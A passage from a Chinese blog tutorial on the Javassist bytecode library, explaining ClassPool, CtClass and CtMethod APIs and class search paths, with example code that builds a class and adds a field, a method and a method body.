表示类中的方法</li><li><code>CtField</code>: 表示类中的字段</li><li><code>CtConstructor</code>:可读写的类构造方法对象</li></ul><h1 id="classpool相关方法"><a href="#ClassPool相关方法" class="headerlink" title="ClassPool相关方法"></a>ClassPool相关方法</h1><ul><li><code>getDefault</code>: 返回默认的<code>ClassPool</code>是单例模式的，一般通过该方法创建我们的<code>ClassPool</code>；</li><li><code>appendClassPath</code>, <code>insertClassPath</code> : 将一个<code>ClassPath</code>加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；</li><li><code>toClass</code> : 将修改后的<code>CtClass</code>加载至当前线程的上下文类加载器中，<code>CtClass</code>的<code>toClass</code>方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；</li><li><code>get</code> , <code>getCtClass</code>: 根据类路径名获取该类的<code>CtClass</code>对象，用于后续的编辑。</li></ul><p>ClassPool对象的创建</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取ClassPool对象, 使用系统默认类路径</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 效果与 new ClassPool(true) 一致，只不过返回的是默认的单例模式</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>为减少ClassPool可能导致的内存消耗； 可以从ClassPool中删除不必要的CtClass对象. 或者每次创建新的ClassPool对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 从ClassPool中删除CtClass对象</span><br>ctClass.detach();<br><span class="hljs-comment">// 也可以每次创建一个新的ClassPool, 而不是ClassPool.getDefault(), 避免内存溢出</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h1 id="ctclass相关方法"><a href="#CtClass相关方法" class="headerlink" title="CtClass相关方法"></a>CtClass相关方法</h1><ul><li>freeze: 冻结一个类，使其不可修改；</li><li>isFrozen : 判断一个类是否已被冻结；</li><li>prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；</li><li>defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；</li><li>detach : 将该class从ClassPool中删除；</li><li>writeFile : 根据CtClass生成 .class 文件；</li><li>toClass : 通过类加载器加载该CtClass。</li><li>setInterfaces: 添加父接口</li><li>setSuperclass: 添加父类</li></ul><h2 id="获取ctclass"><a href="#获取CtClass" class="headerlink" title="获取CtClass"></a>获取CtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<span class="hljs-comment">//未获取到类或抛异常</span><br><span class="hljs-comment">// 通过类名获取 CtClass, 未找到返回 null, 不会抛出异常</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass1</span> <span class="hljs-operator">=</span> pool.getOrNull(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br>ctClass.freeze();<span class="hljs-comment">//冻结类，即不能修改</span><br>System.out.println(ctClass.isFrozen());<span class="hljs-comment">//检查是否冻结，即不可修改</span><br></code></pre></td></tr></table></figure><h2 id="创建ctclass"><a href="#创建CtClass" class="headerlink" title="创建CtClass"></a>创建CtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 复制一个类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass2</span> <span class="hljs-operator">=</span> pool.getAndRename(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>, <span class="hljs-string">&quot;org.clown.ssist.Teacher&quot;</span>);<br><span class="hljs-comment">// 创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass3</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br><span class="hljs-comment">// 通过class文件创建一个新类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass4</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;target/classes/org/clown/ssist/Student.class&quot;</span>)));<br></code></pre></td></tr></table></figure><p>创建一个类然后写入</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建新类并写入</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071508005.png" alt="image-20240907150758908"></p><p>然后就会根据名称保存到对应的目录下，将类持久化了到文件中</p><h2 id="ctclass基础信息"><a href="#CtClass基础信息" class="headerlink" title="CtClass基础信息"></a>CtClass基础信息</h2><p>就是一些类的各种基础信息，类全名、类方法、类字段等</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 类名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">simpleName</span> <span class="hljs-operator">=</span> ctClass.getSimpleName();<br><span class="hljs-comment">// 类全名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ctClass.getName();<br><span class="hljs-comment">// 包名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> ctClass.getPackageName();<br><span class="hljs-comment">// 接口</span><br>CtClass[] interfaces = ctClass.getInterfaces();<br><span class="hljs-comment">// 继承类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">superclass</span> <span class="hljs-operator">=</span> ctClass.getSuperclass();<br><span class="hljs-comment">// 获取类方法</span><br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;getName()&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(String.class.getName()), pool.get(String.class.getName())&#125;);<br><span class="hljs-comment">// 获取类字段</span><br><span class="hljs-type">CtField</span> <span class="hljs-variable">ctField</span> <span class="hljs-operator">=</span> ctClass.getField(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">// 判断数组类型</span><br>ctClass.isArray();<br><span class="hljs-comment">// 判断原生类型</span><br>ctClass.isPrimitive();<br><span class="hljs-comment">// 判断接口类型</span><br>ctClass.isInterface();<br><span class="hljs-comment">// 判断枚举类型</span><br>ctClass.isEnum();<br><span class="hljs-comment">// 判断注解类型</span><br>ctClass.isAnnotation();<br><span class="hljs-comment">// 冻结一个类，使其不可修改</span><br>ctClass.freeze () <br><span class="hljs-comment">// 判断一个类是否已被冻结</span><br>ctClass.isFrozen()<br><span class="hljs-comment">// 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用</span><br>ctClass.prune() <br><span class="hljs-comment">//解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用prune方法</span><br>ctClass.defrost()<br></code></pre></td></tr></table></figure><h2 id="对ctclass进行操作"><a href="#对CtClass进行操作" class="headerlink" title="对CtClass进行操作"></a>对CtClass进行操作</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 添加接口</span><br>ctClass.addInterface(...);<br><span class="hljs-comment">// 添加构造器</span><br>ctClass.addConstructor(...);<br><span class="hljs-comment">// 添加字段</span><br>ctClass.addField(...);<br><span class="hljs-comment">// 添加方法</span><br>ctClass.addMethod(...);<br></code></pre></td></tr></table></figure><h2 id="ctclass编译"><a href="#CtClass编译" class="headerlink" title="CtClass编译"></a>CtClass编译</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取字节码文件 需要注意的是一旦调用该方法，则无法继续修改已经被加载的class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> ctClass.toClass();<br><span class="hljs-comment">// 类的字节码文件</span><br><span class="hljs-type">ClassFile</span> <span class="hljs-variable">classFile</span> <span class="hljs-operator">=</span> ctClass.getClassFile();<br><span class="hljs-comment">// 编译成字节码文件, 使用当前线程上下文类加载器加载类, 如果类已存在或者编译失败将抛出异常</span><br><span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br></code></pre></td></tr></table></figure><h1 id="ctmethod相关方法"><a href="#CtMethod相关方法" class="headerlink" title="CtMethod相关方法"></a>CtMethod相关方法</h1><p><code>CtMthod</code>代表类中的某个方法，可以通过<code>CtClass</code>提供的API获取或者<code>CtNewMethod</code>新建，通过<code>CtMethod</code>对象可以实现对方法的修改。</p><p>CtNewMethod有点类似一个工具类，里面的方法都是静态方法，比如生成一个新的CtMethod</p><p><img src="https://cdn.clown2024.cn/202409060034713.png" alt="image-20240906003402632"></p><ul><li><p>insertBefore : 在方法的起始位置插入代码；</p></li><li><p>insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；</p></li><li><p>insertAt : 在指定的位置插入代码；</p></li><li><p>setBody: 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；</p></li><li><p>make : 创建一个新的方法，本质就是调用CtNewMethod#make</p><p><img src="https://cdn.clown2024.cn/202409060035377.png" alt="image-20240906003533328"></p></li></ul><h2 id="ctmethod属性获取"><a href="#CtMethod属性获取" class="headerlink" title="CtMethod属性获取"></a>CtMethod属性获取</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass5</span> <span class="hljs-operator">=</span> pool.get(TestService.class.getName());<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass5.getDeclaredMethod(<span class="hljs-string">&quot;selectOrder&quot;</span>);<br><span class="hljs-comment">// 方法名</span><br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ctMethod.getName();<br><span class="hljs-comment">// 返回类型</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> ctMethod.getReturnType();<br><span class="hljs-comment">// 方法参数, 通过此种方式得到方法参数列表</span><br><span class="hljs-comment">// 格式: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span><br>ctMethod.getLongName();<br><span class="hljs-comment">// 方法签名 格式: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span><br>ctMethod.getSignature();<br><br><span class="hljs-comment">// 获取方法参数名称, 可以通过这种方式得到方法真实参数名称</span><br>List&lt;String&gt; argKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">methodInfo</span> <span class="hljs-operator">=</span> ctMethod.getMethodInfo();<br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">codeAttribute</span> <span class="hljs-operator">=</span> methodInfo.getCodeAttribute();<br><span class="hljs-type">LocalVariableAttribute</span> <span class="hljs-variable">attr</span> <span class="hljs-operator">=</span> (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> ctMethod.getParameterTypes().length;<br><span class="hljs-comment">// 非静态的成员函数的第一个参数是this</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> Modifier.isStatic(ctMethod.getModifiers()) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> pos; i &lt; len; i++) &#123;<br>    argKeys.add(attr.variableName(i));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ctmethod方法体修改"><a href="#CtMethod方法体修改" class="headerlink" title="CtMethod方法体修改"></a>CtMethod方法体修改</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在方法体前插入代码块</span><br>ctMethod.insertBefore(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在方法体后插入代码块</span><br>ctMethod.insertAfter(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 在某行 字节码 后插入代码块</span><br>ctMethod.insertAt(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// 添加参数</span><br>ctMethod.addParameter(CtClass);<br><span class="hljs-comment">// 设置方法名</span><br>ctMethod.setName(<span class="hljs-string">&quot;newName&quot;</span>);<br><span class="hljs-comment">// 设置方法体 $0=this / $1,$2,$3... 代表方法参数</span><br>ctMethod.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br><span class="hljs-comment">//创建一个新的方法</span><br>ctMethod.make(<span class="hljs-string">&quot;kawa&quot;</span>,CtClass);<br></code></pre></td></tr></table></figure><h2 id="异常块添加"><a href="#异常块添加" class="headerlink" title="异常块添加"></a>异常块添加</h2><p>在方法中加入try catch块, 需要注意的是, 必须在插入的代码中, 加入return值$e代表异常信息.插入的代码片段必须以throw或return语句结束</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ...;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">etype</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;java.io.IOException&quot;</span>);<br>m.addCatch(<span class="hljs-string">&quot;&#123; System.out.println($e); throw $e; &#125;&quot;</span>, etype);<br><span class="hljs-comment">// 等同于添加如下代码: </span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// the original method body</span><br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    System.out.println(e);<br>    <span class="hljs-keyword">throw</span> e;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="类搜索路径"><a href="#类搜索路径" class="headerlink" title="类搜索路径"></a>类搜索路径</h1><p>我们前面获取的ClassPool他有自己的类搜索路径，如果程序运行在JBoss或Tomcat等web服务器上，可能会找不到用户自己的类，我们需要手动添加一个类搜索路径。</p><p>下面是各种添加类搜素路径的各种方式</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过ClassClassPath添加路径*/</span><br><span class="hljs-comment">// 将classpath插入到指定classpath之前</span><br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Student.getClass()));<br><span class="hljs-comment">// 将classpath添加到指定classpath之后</span><br>pool.appendClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(<span class="hljs-built_in">this</span>.getClass()));<br></code></pre></td></tr></table></figure><blockquote><p>该方式添加的时候，比如上面的Student.class，可以将class所在的整个jar添加到搜索路径</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*指定目录添加搜索路径*/</span><br><span class="hljs-comment">// 将一个目录作为classpath</span><br>pool.insertClassPath(<span class="hljs-string">&quot;/xxx/lib&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过url指定搜索路径*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">ClassPath</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassPath</span>(<span class="hljs-string">&quot;www.sample.com&quot;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&quot;/out/&quot;</span>, <span class="hljs-string">&quot;com.test&quot;</span>);<br>pool.insertClassPath(cp);<br></code></pre></td></tr></table></figure><blockquote><p>上述代码将<a href="http://www.sample.com/out%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%B1%BB%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84%E3%80%82%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AAURL%E5%8F%AA%E8%83%BD%E6%90%9C%E7%B4%A2%60com.test%60%E5%8C%85%E9%87%8C%E9%9D%A2%E7%9A%84%E7%B1%BB%E3%80%82">http://www.sample.com:80/out添加到类搜索路径。并且这个URL只能搜索`com.test`包里面的类。</a></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过ByteArrayPath添加搜索路径*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">byte</span>[] buf = 字节数组;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> 类名;<br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayClassPath</span>(name, buf));<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.get(name);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过输入流加载class*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span>  class文件对应的输入流;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(ins);<br></code></pre></td></tr></table></figure><h1 id="读写字节码"><a href="#读写字节码" class="headerlink" title="读写字节码"></a>读写字节码</h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;test.Rectangle&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><code>ClassPool</code>的<code>getDefault()</code>方法将会查找系统默认的路径来搜索<code>test.Rectable</code>对象，然后将获取到的<code>CtClass</code>对象赋值给cc变量，如果对象没有被找到，那么<code>get()</code>方法就会创建出一个默认的<code>CtClass</code>对象，然后放入到<code>HashTable</code>中，同时将当前创建的对象返回。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] b = cc.toBytecode(); <span class="hljs-comment">//直接获取字节码</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cc.toClass(); <span class="hljs-comment">//获取Class</span><br></code></pre></td></tr></table></figure><p><code>toClass()</code>方法调用使得当前线程中的context class loader加载此CtClass类，然后生成<code>java.lang.Class</code>对象。</p><h1 id="对类的相关操作"><a href="#对类的相关操作" class="headerlink" title="对类的相关操作"></a>对类的相关操作</h1><p>主要还是学一下具体的使用，太深入的东西先不看，参考文章：<a href="https://blog.csdn.net/weixin_54902210/article/details/129562446">https://blog.csdn.net/weixin_54902210/article/details/129562446</a></p><p>这里基于前面创建的Hello类进行操作</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><h2 id="添加属性"><a href="#添加属性" class="headerlink" title="添加属性"></a>添加属性</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtField;<br><span class="hljs-keyword">import</span> javassist.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071630618.png" alt="image-20240907163059547"></p><p>赋值也可以这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ctClass.addField(name,<span class="hljs-string">&quot;name=\&quot;Sentiment\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>但这种赋值偏向于用构造器等进行初始化</p><h2 id="添加方法"><a href="#添加方法" class="headerlink" title="添加方法"></a>添加方法</h2><p>方法可以设置的返回类型</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass booleanType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass charType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass byteType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass shortType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass intType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass longType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass floatType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass doubleType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass voidType;<br></code></pre></td></tr></table></figure><p>这里不支持直接用String，是因为在java字节码中，参数和返回类型的String一般都是用常量池中字符串的索引值，要设置String类型的话就和前面一样用<strong>classPool.getCtClass(“java.lang.String”)</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br><br>        <span class="hljs-comment">//3.添加方法</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//分别是返回类型，方法名，方法参数，要添加的方法的CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置方法为public</span><br>        ctClass.addMethod(test);<br>        ctClass.writeFile();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071700312.png" alt="image-20240907170022235"></p><h3 id="设置方法体"><a href="#设置方法体" class="headerlink" title="设置方法体"></a>设置方法体</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//3.添加方法</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//分别是返回类型，方法名，方法参数，要添加的方法的CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置方法为public</span><br>        ctClass.addMethod(test);<br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//4.设置方法体</span><br>        test.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;Hello World\&quot;);&quot;</span>);<br>        ctClass.writeFile();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071702140.png" alt="image-20240907170209069"></p><h3 id="方法体前后插入代码"><a href="#方法体前后插入代码" class="headerlink" title="方法体前后插入代码"></a>方法体前后插入代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">test.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;我在前面插入:\&quot;+$1);&quot;</span>);<br>test.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;我在后面插入了:\&quot;+$2);&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071704977.png" alt="image-20240907170453863"></p><h2 id="添加构造器"><a href="#添加构造器" class="headerlink" title="添加构造器"></a>添加构造器</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;classPool.getCtClass(<span 